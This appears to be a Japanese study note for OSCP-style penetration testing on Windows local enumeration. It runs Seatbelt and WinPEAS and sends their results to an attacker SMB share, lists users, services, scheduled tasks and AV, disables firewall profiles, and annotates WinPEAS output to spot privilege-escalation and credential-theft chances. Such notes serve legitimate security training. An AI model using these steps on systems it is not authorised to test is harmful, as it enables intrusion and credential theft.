- 関連ノート
	- [[マインド#列挙時の心構え]]
	- [[🔍 Credentials Harvesting]]

- Local Enumeration→AD Enumerationの流れ

---

# 自動化ツールによる列挙

## 目的

- Enumerationを自動化し、すばやく権限昇格ベクターを見つける
	- 🚨過検知や見逃しの可能性を常に考慮する
	- 手動でしか発見できないようなそのターゲットシステム独自の構成は自動化ツールには発見できない
- 権限昇格後においても、すばやく機密情報を探索するために使う

## 実行コマンド

WinPEASは誤検知が多いため、手動での検査はもちろん、Seatbeltでもスキャンする（複数のツールでスキャンすることで、異なる結果や見逃しに気付ける）

Seatbelt
```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\<AttackerIP>\share\seatbelt_result.txt
```
- `-group`引数に取れる値の一部：
	- `all`：全てのチェックを実行（非常に量が多い）
	- `system`：OSの設定、パッチ状況、サービスなどのシステム情報を調査
	- `user`：ユーザーごとの設定、保存された認証情報、履歴などを調査

WinPEAS
```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\<AttackerIP>\share /user:username pw
cp \\<AttackerIP>\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\<AttackerIP>\share\peas_result.txt
```
- [[ファイル操作、ユーティリティ#SMB]]

---

# ユーザー情報・ホスト名の列挙

## 目的

- どのユーザー・グループが特権を持っていそうかを明らかにする
- どのユーザー・グループがRDP / WinRM接続可能かを明らかにする
- ==足場を獲得したらまずはじめに実施すること==
	- →ユーザーの列挙が最短のPEベクター

## 着目ポイント

- `admin`：adminが含まれるユーザー・グループは特権をもつ可能性
- `Backup`：閲覧権限がないファイルでも復元できる権限をもつ可能性
	- `Backup Operators`：組込みグループで、どのファイルでも復元できる特権をもつ
- `Helpdesk`：一般ユーザーに比べ何か特権を持っている可能性がある
- `Remote Desktop/Management`グループ：
	- `Desktop`：RDP接続でGUIアクセスが可能
	- `Management`：WinRM（遠隔PowerShell）が可能
	- ※`Administrators`グループなら両方可能
- 補足：[[#管理者のアカウント運用について]]

## ユーザー情報・ホスト名の列挙コマンド

現在のユーザー名・ホスト名
```cmd
whoami
```
- ホスト名：そのマシンの役割や種別を示すことが多い
	- 例：WEB01＝webサーバー、MSSQL01＝MSSQLサーバー

現在のユーザーが所属するグループ
```powershell
whoami /groups

# グループ名のみの表示
whoami /groups /fo csv | ConvertFrom-Csv | Select-Object "Group Name"
```
- グループだけでなく、`NT AUTHORITY\NTLM Authentication`や`Everyone`など、そのユーザーの状態やログイン方法を表す出力もあるため、`Get-LocalGroup`で存在するグループかどうかを確認すること

現在のユーザーの権限
```cmd
whoami /priv
```
- StateがDisabledは、実行中のプロセスがたった今"使っていない"だけで有効

ローカルに存在するユーザー一覧
```powershell
# cmd.exeの場合：net user
Get-LocalUser
```

ローカルに存在するグループ一覧
```powershell
# cmd.exeの場合：net localgroup
Get-LocalGroup
```

グループに所属するユーザー
```powershell
# cmd.exeの場合：net localgroup <group>
Get-LocalGroupMember <group>
```
- 組込みグループの`Administrator`は確認必須

ユーザーアカウントの詳細確認
```cmd
net user <username>
```

---

# 基本的なシステム情報の列挙

## 目的

- マシンのOS、バージョン、アーキテクチャを確認して、脆弱性や利用可能な攻撃ツールを特定する

## 基本的なシステム情報の列挙コマンド

OS・バージョン・アーキテクチャの表示
```powershell
systeminfo
```
- `OS Name`
- `OS Version xxxx Build [num]`：Buildの番号を[List of Microsoft Windows versions - Wikipedia](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)で検索することで、詳細で**正確**なOSバージョンがわかる
- `System Type`：64bitか32bitかで使用できるPEファイルが異なる

Access deniedの場合
```powershell
Get-ComputerInfo
```
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName

reg query "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" /v Identifier
```

インストールされたセキュリティパッチを確認する
```powershell
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```
- 💥インストールされたセキュリティパッチをメモし、ターゲットのOSを[Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/deployments)のページで検索し、未修正の脆弱性を明らかにする
	- 日付範囲は１年のみ選択可能
![[Pasted image 20250823155239.png]]
$$MSRCの検索結果$$

---

# ネットワーク情報の列挙

## 目的

- マシンのネットワーク構成や、アクセス可能なリソース（ADや他のマシン）を特定する
- Nmapではわからなかったサービスが動作していないかを確認する

## ネットワーク情報収集コマンド

すべてのネットワークインターフェース情報
```powershell
ipconfig /all
```
- Physical Address（MACアドレス）：MACアドレスにはベンダーごとにプレフィックスがあり、製品を絞ることができる（OUIという）
	- [MACアドレス検索](https://uic.jp/mac/)
- DHCP Enabled：DHCPを利用していない場合は、静的IPの資産で重要性が高い可能性有
- DNS Servers：ターゲット所有かクラウドサービスを使っているか、ターゲットが所有するサーバーであればセキュリティレベルが低い可能性有（ゾーン転送）
- 💡異なるサブネットに属する複数のNICを持つ場合は、内部NWへの足がかりとして使える可能性あり
	- 次の画像では、サブネットが異なるIPと複数のアダプタが観測されており、Default Gatewayが設定されていない172.....254のIPがあるため、このホストが内部NWのゲートウェイとして機能している可能性がある
	- つまり、172.16.229.0/24への入口
![[Pasted image 20251118082433.png]]
$$ipconfigの結果例$$

ルーティングテーブル
```powershell
route print
```
- 侵害した足場から内部NWへアクセスしたいときなど、そのマシンから他にどのマシンにアクセスできそうかを確認できる
- →怪しいサブネットがあったら[[Port Scan & Vuln Scan#ホストディスカバリ]]でアクセス可能なIPアドレスを列挙する
-  [[#補足：ルーティングテーブルの見方]]

ARPテーブルを確認（同じLAN上の通信可能な他のシステムを発見）
	補足：224-239はClassDで、マルチキャスト(1対多)専用
```powershell
arp -a
```

アクティブなネットワーク接続一覧
```powershell
netstat -ano
```
	↓
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3340
  ...
```
- State LISTINING：そのポートで何かのサービスが動作している
- State ESTABLISHED：現在使用中
- ポート番号から、動作しているサービスを推測できる→[[#実行中のプロセスの列挙]]で列挙したPIDと突合して、どのポートでどのサービスが動作しているかを確定
- 補足：[[#ルーティングテーブルの見方]]

---

# インストール済みアプリケーションの列挙

## 目的

- マシンにインストールされているソフトウェアや実行中のサービスを特定し、権限昇格やその他の攻撃ベクターを探す
- **権限昇格後も**、そのユーザーがインストールしたアプリケーションを列挙する

## インストール済みアプリケーションの列挙コマンド

インストール済みアプリケーションの列挙（可視性高）
```powershell
# Access deninedのときは、reg query "HKLM\..."もしくはGet-Item "HKLM\.."
$paths = @(
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName
```
	↓
```
DisplayName                 DisplayVersion   InstallLocation   
-----------                 --------------   ---------------     
7-Zip 21.07 (x64)           21.07            C:\Program Files\7-Zip\
FileZilla 3.63.1            3.63.1           C:\FileZilla\FileZilla FTP Client
KeePass Password Safe       2.51.1   
```
- →パスワードマネージャーを使っている場合は、クラックへ：[[Password Attack]]
- →設定ファイルに含まれる認証情報列挙へ：[[#ファイルに含まれる認証情報の列挙]]

インストール済アプリケーションの列挙モレがないことを確認
```powershell
# 64bit版
dir "C:\Program Files"
# 32bit版
dir "C:\Program Files (x86)"
# Downloadフォルダの探索
dir ~\Downloads
```

- 補足：[[#インストール済みアプリ列挙コマンド詳細]]
- [[用語#レジストリのHKCU、HKLMの違い]]

---

# 実行中のプロセスの列挙

## 目的

- 実行中のプロセスを確認し、脆弱なアプリケーションや特権のあるプロセスを特定する
- どのプロセスがどのポートで動作しているか確定させる
- プロセス情報の中に機敏な情報がないかを探す

## プロセスの列挙コマンド

実行中プロセスの確認
```powershell
# 除外ワードは,"<term>"で追加可能
ps | Where-Object -Property ProcessName -notin "svchost"
```
	↓
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName         
-------  ------    -----      -----     ------     --  -- -----------         
     58      13      528       1088       0.00   2064   0 access              
...                                                  
```
- →Idと[[#ネットワーク情報の列挙]]の`netstat`で表示されたPIDを突合し、どのポートでどのプロセス（ProcessName）が動作しているかを確定できる

実行中のプロセスの絞りこみ表示
```powershell
ps -id <PID>
```

実行プロセスのディレクトリ表示
```powershell
ps -id <PID> | Select-Object Path
```

リアルタイムにプロセスの状況を確認
```zsh
# kaliにwatch-command.ps1をインストールして転送する必要がある
wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
```
```powershell
import-module .\Watch-Command.ps1
# 実行時のプロセスとの差分のみを30秒間隔で表示する
ps <search_word> -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
```
- 出力の「SI」はSessionIDの意
	- 0： システムサービス、バックグラウンドプロセスが実行される特別なセッションであり、**高権限の可能性が高い**
	- 1：最初のユーザーログオンセッションであり、一般ユーザーのプロセスが実行される
	- 2以降：追加のユーザーログオンセッション

>[!TIP]
>サービス、スケジュールタスクで編集可能なファイルが実行されていない場合は、プロセスを疑う　→ プロセスのSIが「0」、かつファイルをペイロードで上書きできれば、権限昇格につながる可能性がある

---

# サービスの列挙

## 目的

- 権限昇格に利用可能な Windows サービスを特定する  
	- 高権限（LocalSystem / 管理者権限）で実行されているサービス 
	- サービスバイナリや設定が一般ユーザーにより変更可能なもの  
	- Unquoted Service Path や非標準ディレクトリ実行のサービス

## サービスの列挙コマンド

[[用語#サービス]]
[[💥Windows Privilege Escalation#Serviceを利用したPrivEsc]]

実行中のサービス一覧を列挙
```powershell
# cmd.exeの場合：sc query [service] ・ sc qc [service]
Get-CimInstance -ClassName Win32_Service |
  Where-Object { 
      $_.State -eq 'Running' -and 
      $_.StartName -notin @('NT AUTHORITY\LocalService', 'NT AUTHORITY\NetworkService') 
  } |
  Select-Object Name, StartName, PathName
```

編集可能(M)なサービス一覧の列挙 w/[PowerUp.ps1](https://powersploit.readthedocs.io/en/latest/Privesc/)
```powershell
# PowerShellが利用できないときは、Accesschk.exeを使用する（方法はHackTricksに記載）
powershell -ep bypass
import-module .\PowerUp.ps1
Get-ModifiableService
Get-ModifiableServiceFile
```

[[💥Windows Privilege Escalation#Service Exploits - Unquoted Service Path]]用に、Windows標準フォルダ以外で実行されるサービス、かつ、バイナリがクオテーションで囲まれていないものを列挙
```cmd
# 最新環境ではwmicは使えない
wmic service get Name, PathName, StartName |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
```powershell
Get-WmiObject win32_service | Select-Object Name, PathName, StartName | Where-Object { $_.PathName -notmatch 'C:\\Windows\\' -and $_.PathName -notmatch '"' }
```
- ⚠️出力のPathNameが空白となるものは、アクセス権限がない

### 💡Tips：サービス列挙がpermisison deniedで実行できないとき

- WinRMやbind shellのように、完全にインタラクティブなシェル（RDPやssh）でないとWMIやCMIが使えずPermission deniedが返ることがある

レジストリから、Windows標準フォルダ以外で実行されるサービスを列挙
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName
```

実行中かつドライバ以外のサービスを列挙
```cmd
sc query type= service state= running
```

>[!NOTE]
>サービスの詳細を確認するには、`sc.exe qc <service>`

---

# スケジュールタスクの列挙

## 目的

PrivEscにつなげられる以下の条件を満たすタスクを列挙する：
1. タスクを実行するユーザーアカウント（プリンシパル）が自分以外
	- 自身の権限で実行されるタスクは権限昇格に使えない

2. タスクが攻撃者が許容する時間内に何度かトリガーされる
	- ScheduleTypeがOne Time OnlyやOnEventはスルーでよい

3. タスクの実行内容がファイルの実行である
	- COM handlerは原則スルーでよい

## スケジュールタスク列挙コマンド

[[💥Windows Privilege Escalation#Scheduled Tasksを利用したPrivEsc]]

PrivEsc可能なScheduled Taskの候補を簡易的に列挙する
	⚠️フィルターを強くしているため、見逃しの可能性あり
```powershell
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,ScheduleType,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```
- 上述の条件を満たすタスク以外はフィルターしている

💡編集可能なScheduled Taskの列挙 w/[PowerUp.ps1](https://powersploit.readthedocs.io/en/latest/Privesc/)
```powershell
powershell -ep bypass
import-module .\PowerUp.ps1
Get-ModifiableScheduledTaskFile
```

基本的な列挙
	出力が膨大で使いづらい
```cmd
schtasks /query /fo LIST /v
```
- 出力の着眼点：
	- Next Run Time：次回いつタスクが実行されるのか
	- Run As User：タスクの実行ユーザー（高権限ユーザーがいい）
	- Task To Run：タスクが実行する内容（ファイルの実行がいい）
	- Schedule Type：時間ごと、イベントごと等、タスクがトリガーされる条件

---

# AVの列挙

## 目的

- マシンにインストールされているアンチウイルス（AV）ソフトウェアを特定し、そのステータスや詳細情報を収集する
- うまくツール/ペイロードが実行できないときの原因の切り分けをする

## AV列挙コマンド例

AVの列挙 (WMIC使用)
```powershell
wmic /namespace:\\root\securitycenter2 path antivirusproduct
```

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

代替コマンド（Access deniedの場合）
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "antivirus"
```

### Microsoft Defenderの列挙

#### 目的

- Microsoft Defenderのステータスを確認し、リアルタイム保護機能の有効化状況や検出した脅威を把握する

#### コマンド例

```powershell
Get-Service WinDefend
```

- リアルタイム保護機能の確認
```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

- 検出された脅威の確認
```powershell
Get-MpThreat
```

代替コマンド（Access deniedの場合）:
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender" /s
```

---

# ホストベースFWの列挙

## 目的

- ホスト上のFW設定を特定し、ルールやプロファイルの詳細を把握することで、ツール/ペイロードの通信が遮断されないようにする

## ホストベースFWの列挙コマンド例

FWプロファイルの状態確認
```powershell
Get-NetFirewallProfile | Format-Table Name, Enabled
```

特定プロファイルの無効化（管理者権限）
```powershell
Set-NetFirewallProfile -Profile <プロファイル名> -Enabled False
```

FWルールの確認
```powershell
Get-NetFirewallRule | select DisplayName, Enabled, Description
```

ポートの接続テスト
```powershell
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
```

代替コマンド（Access deniedの場合）:
```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s
```

---

# チェックリスト

- [ ]  [[🔍 Credentials Harvesting]]は実行可能なアカウントすべてで実施したか？
- [ ] 権限昇格後も、十分に列挙したか？（他のマシンでdeat endになることがある）
- [ ] 

---
---

# 補足事項まとめ

## 管理者のアカウント運用について

- 管理者は、非特権アカウントと特権アカウントの２つをもつことが多い
- 非特権アカウントは通常業務、特権アカウントは管理業務
- 特権アカウントでリスクのあるタスク（インターネットアクセス等）はしない

---

## ルーティングテーブルの見方

![[Pasted image 20250724124100.png]]
$$ルーティングテーブルの例$$

### セクション一覧

| セクション名           | 内容                          |
| ---------------- | --------------------------- |
| Interface List   | ネットワークインターフェースの一覧（番号、MACなど） |
| IPv4 Route Table | IPv4のルーティングテーブル（アクティブ・永続）   |
| IPv6 Route Table | IPv6のルーティングテーブル（アクティブ・永続）   |

### Interface List

```nginx
Interface List
  4...00 50 56 ab ee 51 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
```

| 項目         | 意味                                        |
| ---------- | ----------------------------------------- |
| インターフェース番号 | `route print` の他セクションで参照される識別子            |
| MACアドレス    | OUIから製品ベンダ・仮想環境（VMware, Hyper-Vなど）の特定に使える |
| アダプタ名      | 利用中のドライバや仮想NICの識別（例：vmxnet3）              |

### IPv4 Route Table > Active Routes

```nginx
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
0.0.0.0                    0.0.0.0          192.168.215.254  192.168.215.220  16
```

| 項目                  | 意味                                                                                                   |
| ------------------- | ---------------------------------------------------------------------------------------------------- |
| Network Destination | 宛先ネットワークアドレス                                                                                         |
| Netmask             | サブネットマスク                                                                                             |
| Gateway             | 宛先に届かない場合の転送先（On-linkの場合は直結）                                                                         |
| Interface           | 出力インターフェースのIPアドレス                                                                                    |
| Metric              | 優先度。値が小さいほど優先的に使用されるルート<br>（まずNetwork Destinationが一致するものを探す。次に同じNetmaskで複数のルートがあった場合のみ、Metricの比較を行う） |

`0.0.0.0`はデフォルトルートで、どのルートにも一致しないパケットが向かう**最後**の手段の経路（`0.0.0.0`＝すべてのIPv4に合致）

### IPv4 Route Table > Persistent Routes

```nginx
Persistent Routes:
  Network Address      Netmask        Gateway Address    Metric
  0.0.0.0              0.0.0.0        192.168.215.254    1
```

| 項目                | 意味                  |
| ----------------- | ------------------- |
| Persistent Routes | 再起動しても保持されるルート      |
| Gateway Address   | 常時使用されるゲートウェイ       |
| Metric            | 通常のルートよりも優先されることがある |

### 攻撃者視点での注目ポイント

| チェック項目                    | 内容                           | 利用方法（攻撃者目線）                      |
| ------------------------- | ---------------------------- | -------------------------------- |
| デフォルトルートの存在               | 0.0.0.0/0 → ゲートウェイ経由で外部通信が可能 | インターネットへ出られる＝リバースシェル可能性あり        |
| 複数ネットワークセグメントへのルート        | 例：10.0.0.0/8、172.16.0.0/12など | 横展開や内部ネットワーク探索への足がかり             |
| On-link セグメントの一覧          | 直接通信可能なネットワーク                | 近隣ホストの発見、SMB/RPC/NetBIOSなどの列挙に利用 |
| Interface List の仮想NICやMAC | VMware, VirtualBox などの仮想環境識別 | 分析環境回避、ターゲットの実環境か調査              |
| Persistent Routes の存在     | 永続的なルーティング設定（業務で必要な通信）       | 通信先の優先ネットワーク、VPNやバックアップ回線などの手がかり |

---

## インストール済みアプリ列挙コマンド詳細

```powershell
# 64ビット版Windowsで動作する32bitアプリ
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion

# 64bitアプリ（全ユーザー）
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName,DisplayVersion

# 現在ログオン中のユーザーだけにインストールされたアプリ
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

---

## WinPEAS結果の見方

前提：
- 低権限ユーザーとして実行したときの実際の出力（最初のASCIIアートを除く）をもとに、検知内容について細かく追記していく
- エクスプロイト技法への補足などは、OSCP試験範囲内でのみ行うため、不要なところは削除している

### 凡例

```powershell
[+] Legend:
	 Red                Indicates a special privilege over an object or something is misconfigured
	 Green              Indicates that some protection is enabled or something is well configured
	 Cyan               Indicates active users
	 Blue               Indicates disabled users
	 LightYellow        Indicates links
```

### WMIの使用可否

- WMIを使用してユーザーアカウント情報を取得しようとした際に、アクセス権限が不足しているため、ユーザーアカウントの詳細な列挙ができない
	- →手動`net`で列挙可能か確認
	- [ ] 読み取れた場合の成功例も追記
```powershell
- Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied 
at System.Management.ThreadDispatch.Start()
```

### システム情報

- [ ] 要編集（他の権限が足りて読み取れたものを具体例として）
```powershell
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).
```

- システムシャットダウン情報の読み取り
	- 現在のWinPEAS実行時刻との差分から、システムの連続稼働時間を測定
	- 長期間シャットダウンしていなければ、パッチ未適用の可能性や<u>平文のパスワード 、Kerberosチケットなどがメモリに残っている</u>可能性あり
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
    Last Shutdown Date/time        :    11/1/2024 9:37:00 AM
```

- ユーザーの環境変数の読み取り
	- アプリケーションに読み込ませるため、ユーザーの環境変数に<u>パスワードやキー</u>を保存していることがある
	- "System Environment Variables"と同じ変数があれば、PATH変数を除き、"User Environment Variables"で上書きされる（PATH = System PATH + User PATH）
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: SRV22 # NW上での役割を推測
    PUBLIC: C:\Users\Public # すべてのユーザーがアクセスできる
    LOCALAPPDATA: C:\Users\<username>\AppData\Local # ユーザー固有の設定ファイル、キャッシュデータなど
    PROCESSOR_ARCHITECTURE: AMD64 #ソフトウェアのアーキテクチャをこの値に合わせる
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\; # インストールされたアプリケーションや、どのパスを優先処理したいか
    ProgramData: C:\ProgramData # アプリ設定ファイルが保存される。一般的でないアプリがあれば要注目
    USERDOMAIN: OSCP # NetBIOIS名
    USERDNSDOMAIN: oscp.exam #  DNS名
```

- システム環境変数
	- すべてのユーザーに適用される
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
...
    TEMP: C:\Windows\TEMP # 通常は書き込み不可
```

- 監査・ログ設定
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found # 監査設定がされていないので、痕跡が残りにくい

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found # ログがどこにも送られないので、痕跡削除がローカルで完結する
```

- 認証情報の保護機能について
	- すべて無効であれば、認証情報窃取しやすい
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled
```

- 認証情報のキャッシュ機能（※）の有無→SYSTEM昇格後に認証情報読み取り可能
	- （※）Windowsユーザーのログオン情報をローカルにキャッシュし、後のログオン試行中にログオン サーバー（DC）が使用できない場合にもログオンできる機能
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10 # 設定値であり、現在数ではない（10は初期値）

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)
```

- AVの稼働、UACの有無
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!! # サードパーティのAVがインストールされていない
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings 
  Group Policy Settings # Defenderは存在するが、詳細設定は表示できない（表示するものがなかったか、権限不足）

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting # UACプロンプトがない
    EnableLUA: 0 # 管理者ユーザーが昇格なしで高権限の操作が可能
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement. # 権限はそのままLM可能
```

- PowerShellのログやバージョン
	-   PS history fileが空欄であれば、履歴ファイルが存在しない可能性あり
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)
```

- ドライバーに対する権限やストレージ
	- `[Allow: AppendData/CreateDirectories]`とあれば、一般ユーザーでもドライバ直下にデータの追加・ディレクトリ作成可能
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 37 GB)(Permissions: Users [Allow: AppendData/CreateDirectories]) 
    D:\ (Type: CDRom)
```

- WSUSの設定
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found # WSUS(更新プログラムの配布と適用を自動でするツール)が無効なので、パッチ未適用の可能性あり
```

- KrbRelayUpとAlwaysInstalledElevatedの有効性
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp # ドメインに所属していれば、必ず"it could be vulnerable."と表示される
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (OSCP) so it could be vulnerable.
È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated　
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isnt available　# CTFくらいでしか有効でないが、有効なら即PE
```

- LSA（Local Security Authority）の設定値
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
    LimitBlankPasswordUse                :       1 # 空パスワードがログインに使えるか
    NoLmHash                             :       1 # 脆弱なLMハッシュが利用可能か
    Authentication Packages              :       msv1_0 # msv1_.0はNTLM認証有効、他にもKerberosがある
    disabledomaincreds                   :       0 # 認証情報キャッシュが有効か
    everyoneincludesanonymous            :       0 # 認証情報なしでログオンできるか
    restrictanonymoussam                 :       1 # SAMアカウントと共有の列挙を許可するか
    RunAsPPL                             :       0 # PPLが無効ならメモリダンプ可能
```

- NTLM認証の設定
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings # requireがFalse→PtHやResponderを使った中間者攻撃攻撃が可能
      ClientRequireSigning    : False # signを求めるか
      ClientNegotiateSigning  : True # 機能そのものの有無
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)


  NTLM Auditing and Restrictions　#NTLMの使用を制限しているか
      InboundRestrictions     :  (Not defined) 
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 
```

- GPOの列挙（BloodHoundでは列挙できないローカルGPOも列挙）
- [ ] 以降、後ほど整理（2026/01/12）
```powershell
